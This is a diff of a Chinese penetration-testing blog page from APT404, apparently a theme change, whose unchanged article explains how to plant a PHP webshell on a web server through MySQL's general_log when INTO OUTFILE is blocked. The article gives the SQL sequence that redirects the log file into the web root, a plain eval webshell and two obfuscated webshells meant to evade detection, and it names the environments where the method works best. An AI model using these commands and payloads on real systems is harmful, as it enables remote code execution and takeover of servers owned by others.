@@ -1,175 +1,153 @@
 <!DOCTYPE html>
-<html lang="en">
-
-<!-- Head tag -->
+<html lang=zh>
 <head>
-
+    <!-- so meta -->
     <meta charset="utf-8">
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
-    <meta name="viewport" content="width=device-width, initial-scale=1">
-
-    <!--Description-->
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1" />
+    <meta name="description" content="0x01 前言:&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;实际渗透过程中,我们很可能会遇到这样的情况,明明是正儿八经的mysql root权限,但实际利用into outfile写shell的时候,却怎么写不进去,可以肯定的前提是,我们对目标的网站目录绝对是有写权限的且mysql的root用户本身并没有被降权,一般出现这样的情况很可能就是因为into outfile被禁用或waf拦截,希望下">
+<meta name="keywords" content="webshell">
+<meta property="og:type" content="article">
+<meta property="og:title" content="利用mysql的general log 写shell[突破into outfile]">
+<meta property="og:url" content="https://apt404.github.io/2017/03/25/mysql-log-write-webshell/index.html">
+<meta property="og:site_name" content="APT404-不疯不魔怎么活">
+<meta property="og:description" content="0x01 前言:&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;实际渗透过程中,我们很可能会遇到这样的情况,明明是正儿八经的mysql root权限,但实际利用into outfile写shell的时候,却怎么写不进去,可以肯定的前提是,我们对目标的网站目录绝对是有写权限的且mysql的root用户本身并没有被降权,一般出现这样的情况很可能就是因为into outfile被禁用或waf拦截,希望下">
+<meta property="og:locale" content="zh-Hans">
+<meta property="og:image" content="https://apt404.github.io/img/show%20variables%20waf.png">
+<meta property="og:image" content="https://apt404.github.io/img/show%20variables%20config.png">
+<meta property="og:image" content="https://apt404.github.io/img/show%20variables%20write%20shell.png">
+<meta property="og:image" content="https://apt404.github.io/img/show%20variables%20log%20exec.png">
+<meta property="og:image" content="https://apt404.github.io/img/show%20variables%20res.png">
+<meta property="og:updated_time" content="2017-10-11T13:28:32.000Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="利用mysql的general log 写shell[突破into outfile]">
+<meta name="twitter:description" content="0x01 前言:&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;实际渗透过程中,我们很可能会遇到这样的情况,明明是正儿八经的mysql root权限,但实际利用into outfile写shell的时候,却怎么写不进去,可以肯定的前提是,我们对目标的网站目录绝对是有写权限的且mysql的root用户本身并没有被降权,一般出现这样的情况很可能就是因为into outfile被禁用或waf拦截,希望下">
+<meta name="twitter:image" content="https://apt404.github.io/img/show%20variables%20waf.png">
     
-        <meta name="description" content="0x01 前言:&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;实际渗透过程中,我们很可能会遇到这样的情况,明明是正儿八经的mysql root权限,但实际利用into outfile写shell的时候,却怎么写不进去,可以肯定的前提是,我们对目标的网站目录绝对是有写权限的且mysql的root用户本身并没有被降权,一般出现这样的情况很可能就是因为into outfile被禁用或waf拦截,希望下面的方式能帮到你">
     
-
-    <!--Author-->
+        
+          
+              <link rel="shortcut icon" href="/images/favicon.ico">
+          
+        
+        
+          
+            <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
+          
+        
+        
+          
+            <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+          
+        
     
-        <meta name="author" content="John Doe">
-    
-
-    <!--Open Graph Title-->
-    
-        <meta property="og:title" content="利用mysql的general log 写shell[突破into outfile]"/>
-    
-
-    <!--Open Graph Description-->
-    
-
-    <!--Open Graph Site Name-->
-    <meta property="og:site_name" content="APT404-不疯不魔怎么活"/>
-
-    <!--Type page-->
-    
-        <meta property="og:type" content="article" />
-    
-
-    <!--Page Cover-->
-    
-
-    <meta name="twitter:card" content="summary" />
-    
-
-    <!-- Title -->
-    
-    <title>利用mysql的general log 写shell[突破into outfile] - APT404-不疯不魔怎么活</title>
-
-    <!-- Bootstrap Core CSS -->
-    <link rel="stylesheet" href="//maxcdn.bootstrapcdn.com/bootstrap/4.0.0-alpha.2/css/bootstrap.min.css" integrity="sha384-y3tfxAZXuh4HwSYylfB+J125MxIs6mR5FOHamPBG064zB+AFeWH94NdvaCBm8qnd" crossorigin="anonymous">
-
-    <!-- Custom Fonts -->
-    <link href="//maxcdn.bootstrapcdn.com/font-awesome/4.6.3/css/font-awesome.min.css" rel="stylesheet" type="text/css">
-
-    <!-- HTML5 Shim and Respond.js IE8 support of HTML5 elements and media queries -->
-    <!-- WARNING: Respond.js doesn't work if you view the page via file:// -->
-    <!--[if lt IE 9]>
-        <script src="//oss.maxcdn.com/libs/html5shiv/3.7.0/html5shiv.js"></script>
-        <script src="//oss.maxcdn.com/libs/respond.js/1.4.2/respond.min.js"></script>
-    <![endif]-->
-
-    <!-- Gallery -->
-    <link href="//cdnjs.cloudflare.com/ajax/libs/featherlight/1.3.5/featherlight.min.css" type="text/css" rel="stylesheet" />
-
-    <!-- Custom CSS -->
+    <!-- title -->
+    <title>利用mysql的general log 写shell[突破into outfile]</title>
+    <!-- styles -->
     <link rel="stylesheet" href="/css/style.css">
-
-    <!-- Google Analytics -->
+    <!-- persian styles -->
     
-
-
+      <link rel="stylesheet" href="/css/rtl.css">
+    
+    <!-- rss -->
+    
+    
 </head>
 
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fas fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+         
+          <li><a href="/">Home</a></li>
+         
+          <li><a href="/about/">About</a></li>
+         
+          <li><a href="/Search/">Search</a></li>
+        
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        <li><a class="icon" href="/2017/04/23/win-0day-privilege/"><i class="fas fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
+        
+        
+        <li><a class="icon" href="/2017/03/09/msfvenom-advanced/"><i class="fas fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" href="#"><i class="fas fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">Previous post</span>
+      <span id="i-next" class="info" style="display:none;">Next post</span>
+      <span id="i-top" class="info" style="display:none;">Back to top</span>
+      <span id="i-share" class="info" style="display:none;">Share post</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" href="http://www.facebook.com/sharer.php?u=https://apt404.github.io/2017/03/25/mysql-log-write-webshell/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://twitter.com/share?url=https://apt404.github.io/2017/03/25/mysql-log-write-webshell/&text=利用mysql的general log 写shell[突破into outfile]"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.linkedin.com/shareArticle?url=https://apt404.github.io/2017/03/25/mysql-log-write-webshell/&title=利用mysql的general log 写shell[突破into outfile]"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=https://apt404.github.io/2017/03/25/mysql-log-write-webshell/&is_video=false&description=利用mysql的general log 写shell[突破into outfile]"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=利用mysql的general log 写shell[突破into outfile]&body=Check out this article: https://apt404.github.io/2017/03/25/mysql-log-write-webshell/"><i class="fas fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://getpocket.com/save?url=https://apt404.github.io/2017/03/25/mysql-log-write-webshell/&title=利用mysql的general log 写shell[突破into outfile]"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://reddit.com/submit?url=https://apt404.github.io/2017/03/25/mysql-log-write-webshell/&title=利用mysql的general log 写shell[突破into outfile]"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.stumbleupon.com/submit?url=https://apt404.github.io/2017/03/25/mysql-log-write-webshell/&title=利用mysql的general log 写shell[突破into outfile]"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://digg.com/submit?url=https://apt404.github.io/2017/03/25/mysql-log-write-webshell/&title=利用mysql的general log 写shell[突破into outfile]"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.tumblr.com/share/link?url=https://apt404.github.io/2017/03/25/mysql-log-write-webshell/&name=利用mysql的general log 写shell[突破into outfile]&description=&lt;p&gt;&lt;br&gt;&lt;br&gt;0x01 前言:&lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;实际渗透过程中,我们很可能会遇到这样的情况,明明是正儿八经的mysql root权限,但实际利用into outfile写shell的时候,却怎么写不进去,可以肯定的前提是,我们对目标的网站目录绝对是有写权限的且mysql的root用户本身并没有被降权,一般出现这样的情况很可能就是因为into outfile被禁用或waf拦截,希望下面的方式能帮到你&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;/img/show variables waf.png&#34; alt=&#34;&#34;&gt;&lt;br&gt;&lt;br&gt;"><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+</ul>
 
-<body>
-
-<div class="bg-gradient"></div>
-<div class="bg-pattern"></div>
-
-<!-- Menu -->
-<!--Menu Links and Overlay-->
-<div class="menu-bg">
-    <div class="menu-container">
-        <ul>
-            
-            <li class="menu-item">
-                <a href="/">
-                    Home
-                </a>
-            </li>
-            
-            <li class="menu-item">
-                <a href="/archives">
-                    Archives
-                </a>
-            </li>
-            
-            <li class="menu-item">
-                <a href="/about.html">
-                    About
-                </a>
-            </li>
-            
-            <li class="menu-item">
-                <a href="/tags">
-                    Tags
-                </a>
-            </li>
-            
-            <li class="menu-item">
-                <a href="/categories">
-                    Categories
-                </a>
-            </li>
-            
-            <li class="menu-item">
-                <a href="/contact.html">
-                    Contact
-                </a>
-            </li>
-            
-        </ul>
     </div>
+    <div id="toc">
+      
+    </div>
+  </span>
 </div>
 
-<!--Hamburger Icon-->
-<nav>
-    <a href="#menu"></a>
-</nav>
-
-<div class="container">
-
-    <!-- Main Content -->
-    <div class="row">
-    <div class="col-sm-12">
-
-        <!--Title and Logo-->
-        <header>
-    <div class="logo">
-        <a href="/"><i class="logo-icon fa fa-cube" aria-hidden="true"></i></a>
+    
+    <div class="content index my4">
         
-    </div>
-</header>
+        <article class="post" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle" itemprop="name headline">
+        利用mysql的general log 写shell[突破into outfile]
+    </h1>
 
-        <section class="main">
-            
-<div class="post">
 
-    <div class="post-header">
-        <h1 class="title">
-            <a href="/2017/03/25/mysql-log-write-webshell/">
-                利用mysql的general log 写shell[突破into outfile]
-            </a>
-        </h1>
-        <div class="post-info">
-            
-                <span class="date">2017-03-25</span>
-            
-            
-            
-                <span class="category">
-                    <a href="/categories/webshell/">webshell</a>
-                </span>
-            
-        </div>
+
+    <div class="meta">
+      <span class="author" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span itemprop="name">klion</span>
+      </span>
+      
+    <div class="postdate">
+        <time datetime="2017-03-25T01:12:32.000Z" itemprop="datePublished">2017-03-25</time>
     </div>
 
-    <div class="content">
 
-        <!-- Gallery -->
-        
+      
+    <div class="article-tag">
+        <i class="fas fa-tag"></i>
+        <a class="tag-link" href="/tags/webshell/">webshell</a>
+    </div>
 
-        <!-- Post Content -->
-        <p><br><br>0x01 前言:<br>&nbsp;&nbsp;&nbsp;&nbsp;实际渗透过程中,我们很可能会遇到这样的情况,明明是正儿八经的mysql root权限,但实际利用into outfile写shell的时候,却怎么写不进去,可以肯定的前提是,我们对目标的网站目录绝对是有写权限的且mysql的root用户本身并没有被降权,一般出现这样的情况很可能就是因为into outfile被禁用或waf拦截,希望下面的方式能帮到你</p>
+
+    </div>
+  </header>
+  
+
+  <div class="content" itemprop="articleBody">
+    <p><br><br>0x01 前言:<br>&nbsp;&nbsp;&nbsp;&nbsp;实际渗透过程中,我们很可能会遇到这样的情况,明明是正儿八经的mysql root权限,但实际利用into outfile写shell的时候,却怎么写不进去,可以肯定的前提是,我们对目标的网站目录绝对是有写权限的且mysql的root用户本身并没有被降权,一般出现这样的情况很可能就是因为into outfile被禁用或waf拦截,希望下面的方式能帮到你</p>
 <p><img src="/img/show variables waf.png" alt=""><br><br><a id="more"></a><br>0x02 拿shell:<br>&nbsp;&nbsp;&nbsp;&nbsp;利用mysql日志文件来拿shell,究其原理其实也非常简单,当我们开启general_log以后,每执行一条sql都会被自动记录到这个日志文件中,我们就可以通过这种方式把我们的shell也自动写进去,运维可能平时都是拿这个查慢查询用,只会临时开启下,所以,如果想利用,就只能我们自己手动开,这就是为什么要root权限才行,因为它涉及到mysql自身参数配置,其实,这里稍微有点儿mysql常识都会懂:<br><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; show variables like '%general%';   先看下当前mysql默认的日志位置在什么地方,'C:\ProgramData\MySQL\MySQL Server 5.5\Data\2008R2DC.log' 顺手把原来正常的日志路径稍微记录下,等会儿干完活儿再把它恢复回来</span><br><span class="line">mysql&gt; set global general_log = on;  	  默认基本都是关闭的,不然这个增删改查的记录量可能会非常大</span><br></pre></td></tr></table></figure></p>
 <p><img src="/img/show variables config.png" alt=""><br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; set global general_log_file = <span class="string">'C:/Program Files (x86)/Apache Software Foundation/Apache2.2/htdocs/abouts.php'</span>; 此时,再把原本的日志文件位置指向到目标网站的物理路径</span><br><span class="line">mysql&gt; select <span class="string">'&lt;?php eval($_POST[request]);?&gt;'</span>;    开始写shell,这里就是个普通的shell,不免杀,如果有waf的话,可以用下面的免杀shell</span><br></pre></td></tr></table></figure></p>
 <p><img src="/img/show variables write shell.png" alt=""><br><img src="/img/show variables log exec.png" alt=""><br><img src="/img/show variables res.png" alt=""><br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select <span class="string">"&lt;?php $sl = create_function('', @$_REQUEST['klion']);$sl();?&gt;"</span>;    免杀shell,eval方式</span><br><span class="line">mysql&gt; SELECT <span class="string">"&lt;?php $p = array('f'=&gt;'a','pffff'=&gt;'s','e'=&gt;'fffff','lfaaaa'=&gt;'r','nnnnn'=&gt;'t');$a = array_keys($p);$_=$p['pffff'].$p['pffff'].$a[2];$_= 'a'.$_.'rt';$_(base64_decode($_REQUEST['klion']));?&gt;"</span>;     别人的免杀shell,assert&amp;base64encode方式</span><br></pre></td></tr></table></figure></p>
@@ -177,216 +155,95 @@
 <p>0x04 后话<br>&nbsp;&nbsp;&nbsp;&nbsp;并不是什么特别新奇的技巧,都是mysql自身的一些基础特性挖掘利用,大家真正的理解才是主要的,利用过程中可能并非一帆风顺,把解决问题的过程记录下来,才是你真正的收获,祝大家好运</p>
 <p>0x05 想成功利用的两个必要条件:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">事先要想办法找到目标站点的物理路径,不然要把log指向哪里呢,因为我们从外部能访问并执行webshell的地方只有目标的网站目录</span><br><span class="line">当前数据库服务用户对所上面指向的目标网站目录必须能写,不然,log文件是根本没法创建的</span><br><span class="line">其实,说实话,能同时满足这两点的目标并不多,如果目标网站对错误处理的很好,web服务用户和数据库用户权限隔离很清晰基本也是很难利用成功的,确实略显积累,但不失为一种好思路,非常值得拓展</span><br><span class="line">像这种东西可能还是比较适合那些集成环境,比如,appserv,xampp...因为权限全部都映射到同一个系统用户上了,如果是win平台,权限通常都比较高[实际上多数都直接是system]</span><br></pre></td></tr></table></figure></p>
 
-    </div>
+  </div>
+</article>
 
-    
 
-    
-        <div class="post-tags">
-            <i class="fa fa-tags" aria-hidden="true"></i>
-            <a href="/tags/webshell/">#webshell</a>
-        </div>
-    
-
-    <!-- Comments -->
-    
-
-</div>
-        </section>
 
     </div>
-</div>
+    
+      <div id="footer-post-container">
+  <div id="footer-post">
 
-
-</div>
-
-<!-- Footer -->
-<div class="push"></div>
-
-<footer class="footer-content">
-    <div class="container">
-        <div class="row">
-            <div class="col-xs-12 col-sm-12 col-md-6 col-lg-6 footer-about">
-                <h2>About</h2>
-                <p>
-                    This theme was developed by <a href="https://github.com/klugjo">Jonathan Klughertz</a>. The source code is available on Github. Create Websites. Make Magic.
-                </p>
-            </div>
-            
-    <div class="col-xs-6 col-sm-6 col-md-3 col-lg-3 recent-posts">
-        <h2>Recent Posts</h2>
-        <ul>
-            
-            <li>
-                <a class="footer-post" href="/2017/12/29/cobalt-strike-spawn/">灵活使用 cobalt strike 的 `spa</a>
-            </li>
-            
-            <li>
-                <a class="footer-post" href="/2017/12/29/cobalt-strike-dns/">对 Cobalt Strike DNS隧道的理解与</a>
-            </li>
-            
-            <li>
-                <a class="footer-post" href="/2017/12/27/powershell-pic-execute/">通过图片免杀执行远程powershell代码</a>
-            </li>
-            
-            <li>
-                <a class="footer-post" href="/2017/12/26/modify-hacked/">用shell对指定站点进行简单的实时入侵预警</a>
-            </li>
-            
-        </ul>
+    <div id="nav-footer" style="display: none">
+      <ul>
+         
+          <li><a href="/">Home</a></li>
+         
+          <li><a href="/about/">About</a></li>
+         
+          <li><a href="/Search/">Search</a></li>
+        
+      </ul>
     </div>
 
+    <div id="toc-footer" style="display: none">
+      
+    </div>
 
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" href="http://www.facebook.com/sharer.php?u=https://apt404.github.io/2017/03/25/mysql-log-write-webshell/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://twitter.com/share?url=https://apt404.github.io/2017/03/25/mysql-log-write-webshell/&text=利用mysql的general log 写shell[突破into outfile]"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.linkedin.com/shareArticle?url=https://apt404.github.io/2017/03/25/mysql-log-write-webshell/&title=利用mysql的general log 写shell[突破into outfile]"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=https://apt404.github.io/2017/03/25/mysql-log-write-webshell/&is_video=false&description=利用mysql的general log 写shell[突破into outfile]"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=利用mysql的general log 写shell[突破into outfile]&body=Check out this article: https://apt404.github.io/2017/03/25/mysql-log-write-webshell/"><i class="fas fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://getpocket.com/save?url=https://apt404.github.io/2017/03/25/mysql-log-write-webshell/&title=利用mysql的general log 写shell[突破into outfile]"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://reddit.com/submit?url=https://apt404.github.io/2017/03/25/mysql-log-write-webshell/&title=利用mysql的general log 写shell[突破into outfile]"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.stumbleupon.com/submit?url=https://apt404.github.io/2017/03/25/mysql-log-write-webshell/&title=利用mysql的general log 写shell[突破into outfile]"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://digg.com/submit?url=https://apt404.github.io/2017/03/25/mysql-log-write-webshell/&title=利用mysql的general log 写shell[突破into outfile]"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.tumblr.com/share/link?url=https://apt404.github.io/2017/03/25/mysql-log-write-webshell/&name=利用mysql的general log 写shell[突破into outfile]&description=&lt;p&gt;&lt;br&gt;&lt;br&gt;0x01 前言:&lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;实际渗透过程中,我们很可能会遇到这样的情况,明明是正儿八经的mysql root权限,但实际利用into outfile写shell的时候,却怎么写不进去,可以肯定的前提是,我们对目标的网站目录绝对是有写权限的且mysql的root用户本身并没有被降权,一般出现这样的情况很可能就是因为into outfile被禁用或waf拦截,希望下面的方式能帮到你&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;/img/show variables waf.png&#34; alt=&#34;&#34;&gt;&lt;br&gt;&lt;br&gt;"><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+</ul>
 
-            
-<div class="col-xs-6 col-sm-6 col-md-3 col-lg-3 footer-categories">
-    <h2>Categories</h2>
-    <ul>
-        
-        <li>
-            <a class="footer-post" href="/categories/other/">other</a>
-        </li>
-        
-        <li>
-            <a class="footer-post" href="/categories/hash-crack/">hash crack</a>
-        </li>
-        
-        <li>
-            <a class="footer-post" href="/categories/PS1/">PS1</a>
-        </li>
-        
-        <li>
-            <a class="footer-post" href="/categories/LaZagne/">LaZagne</a>
-        </li>
-        
-    </ul>
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fas fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
+        <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fas fa-list fa-lg" aria-hidden="true"></i> TOC</a>
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fas fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
+    </div>
+
+  </div>
 </div>
 
-        </div>
-        <div class="row">
-            <div class="col-xs-12 col-sm-12 col-md-12 col-lg-12">
-                <ul class="list-inline footer-social-icons">
-                    
-                    <li class="list-inline-item">
-                        <a href="https://github.com/klugjo/hexo-theme-alpha-dust">
-                            <span class="footer-icon-container">
-                                <i class="fa fa-github"></i>
-                            </span>
-                        </a>
-                    </li>
-                    
-                    
-                    <li class="list-inline-item">
-                        <a href="https://twitter.com/?lang=en">
-                            <span class="footer-icon-container">
-                                <i class="fa fa-twitter"></i>
-                            </span>
-                        </a>
-                    </li>
-                    
-                    
-                    <li class="list-inline-item">
-                        <a href="https://www.facebook.com/">
-                            <span class="footer-icon-container">
-                                <i class="fa fa-facebook"></i>
-                            </span>
-                        </a>
-                    </li>
-                    
-                    
-                    <li class="list-inline-item">
-                        <a href="https://www.instagram.com/">
-                            <span class="footer-icon-container">
-                                <i class="fa fa-instagram"></i>
-                            </span>
-                        </a>
-                    </li>
-                    
-                    
-                    <li class="list-inline-item">
-                        <a href="https://dribbble.com/">
-                            <span class="footer-icon-container">
-                                <i class="fa fa-dribbble"></i>
-                            </span>
-                        </a>
-                    </li>
-                    
-                    
-                    <li class="list-inline-item">
-                        <a href="https://plus.google.com/">
-                            <span class="footer-icon-container">
-                                <i class="fa fa-google-plus"></i>
-                            </span>
-                        </a>
-                    </li>
-                    
-                    
-                    <li class="list-inline-item">
-                        <a href="https://www.behance.net/">
-                            <span class="footer-icon-container">
-                                <i class="fa fa-behance"></i>
-                            </span>
-                        </a>
-                    </li>
-                    
-                    
-                    <li class="list-inline-item">
-                        <a href="https://500px.com/">
-                            <span class="footer-icon-container">
-                                <i class="fa fa-500px"></i>
-                            </span>
-                        </a>
-                    </li>
-                    
-                    
-                    <li class="list-inline-item">
-                        <a href="mailto:test@example.com">
-                            <span class="footer-icon-container">
-                                <i class="fa fa-envelope-o"></i>
-                            </span>
-                        </a>
-                    </li>
-                    
-                    
-                    <li class="list-inline-item">
-                        <a href="\#">
-                            <span class="footer-icon-container">
-                                <i class="fa fa-rss"></i>
-                            </span>
-                        </a>
-                    </li>
-                    
-                </ul>
-            </div>
-        </div>
-        <div class="row">
-            <div class="col-xs-12 col-sm-12 col-md-12 col-lg-12">
-                <div class="footer-copyright">
-                    @Untitled. All right reserved | Design & Hexo <a href="http://www.codeblocq.com/">Jonathan Klughertz</a>
-                </div>
-            </div>
-        </div>
-    </div>
+    
+    <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy; 2018 John Doe
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+         
+          <li><a href="/">Home</a></li>
+         
+          <li><a href="/about/">About</a></li>
+         
+          <li><a href="/Search/">Search</a></li>
+        
+      </ul>
+    </nav>
+  </div>
 </footer>
 
-<!-- After footer scripts -->
+</body>
+</html>
+<!-- styles -->
+<link rel="stylesheet" href="/lib/font-awesome/css/fontawesome-all.min.css">
+<link rel="stylesheet" href="/lib/justified-gallery/css/justifiedGallery.min.css">
 
-<!-- jQuery -->
-<script src="//code.jquery.com/jquery-2.1.4.min.js"></script>
-
-<!-- Tween Max -->
-<script src="//cdnjs.cloudflare.com/ajax/libs/gsap/1.18.5/TweenMax.min.js"></script>
-
-<!-- Gallery -->
-<script src="//cdnjs.cloudflare.com/ajax/libs/featherlight/1.3.5/featherlight.min.js" type="text/javascript" charset="utf-8"></script>
-
-<!-- Custom JavaScript -->
+<!-- jquery -->
+<script src="/lib/jquery/jquery.min.js"></script>
+<script src="/lib/justified-gallery/js/jquery.justifiedGallery.min.js"></script>
 <script src="/js/main.js"></script>
+<!-- search -->
+
+<!-- Google Analytics -->
+
+<!-- Baidu Analytics -->
 
 <!-- Disqus Comments -->
 
 
-
-</body>
-
-</html>
